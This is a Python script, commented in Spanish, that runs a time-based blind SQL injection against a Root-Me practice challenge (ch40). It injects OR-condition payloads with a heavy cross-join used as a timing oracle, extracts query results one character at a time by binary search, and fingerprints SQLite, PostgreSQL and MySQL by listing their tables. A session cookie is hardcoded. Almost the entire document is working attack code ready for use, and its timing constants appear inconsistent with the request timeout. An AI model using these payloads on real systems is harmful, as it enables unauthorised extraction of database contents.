#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 12 - PROBAR CON SQLITE
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM users, users T1, users T2)"
        self.technique = "or"
        self.debug = False
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition, repeats=3):
        # Técnica OR (invertida)
        payload = f"1 OR ({condition}) OR {self.heavy}"
        t = self.test_payload(payload, repeats=repeats)
        # Invertido: TRUE -> rápido, FALSE -> lento
        return t < self.threshold
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, max_len + 1):
            # Búsqueda binaria
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
                if self.is_true(cond, repeats=2):
                    low = mid + 1
                else:
                    high = mid - 1
            
            char = chr(low)
            result += char
            print(f"  [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:  # NULL o espacio
                break
        return result

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("="*70)
print("  PROBANDO CONSULTAS SQLITE")
print("="*70)

# 1. Información de SQLite
print("\n[1] Consultas SQLite:")
sqlite_tests = [
    ("SELECT sqlite_version()", "SQLite version"),
    ("SELECT 1+1", "Suma"),
    ("SELECT 'abc'", "String literal"),
    ("SELECT 123", "Número"),
    ("SELECT hex('abc')", "HEX"),
]

for query, desc in sqlite_tests:
    result = injector.extract_string(query, desc)
    print(f"  {desc}: {result}\n")

# 2. Verificar si SQLite tiene la tabla sqlite_master
print("\n[2] Verificando sqlite_master...")
if injector.is_true("EXISTS(SELECT * FROM sqlite_master)"):
    print("  ✅ sqlite_master existe")
    
    # Contar tablas
    count = injector.extract_string("SELECT COUNT(*) FROM sqlite_master")
    print(f"  Número de tablas: {count}")
    
    # Listar tablas
    print("\n  Listando tablas:")
    for i in range(1, 10):
        query = f"SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {i-1}"
        result = injector.extract_string(query, f"Tabla {i}")
        if result and result.strip():
            print(f"    Tabla {i}: {result}")
        else:
            break
else:
    print("  ❌ sqlite_master no existe")

# 3. Verificar si es PostgreSQL
print("\n[3] Verificando PostgreSQL...")
if injector.is_true("EXISTS(SELECT * FROM pg_catalog.pg_tables)"):
    print("  ✅ PostgreSQL detectado")
else:
    print("  ❌ No es PostgreSQL")

# 4. Verificar si es MySQL
print("\n[4] Verificando MySQL...")
if injector.is_true("EXISTS(SELECT * FROM information_schema.tables)"):
    print("  ✅ MySQL detectado")
    
    # Listar tablas de MySQL
    print("\n  Listando tablas MySQL:")
    for i in range(1, 10):
        query = f"SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1 OFFSET {i-1}"
        result = injector.extract_string(query, f"Tabla MySQL {i}")
        if result and result.strip():
            print(f"    Tabla {i}: {result}")
        else:
            break
else:
    print("  ❌ No es MySQL")

# 5. Probar con CONCAT (MySQL) vs || (SQLite/PostgreSQL)
print("\n[5] Probando concatenación...")
concat_tests = [
    ("SELECT CONCAT('a','b')", "CONCAT (MySQL)"),
    ("SELECT 'a'||'b'", "|| (SQLite/PostgreSQL)"),
]

for query, desc in concat_tests:
    result = injector.extract_string(query, desc)
    print(f"  {desc}: {result}")
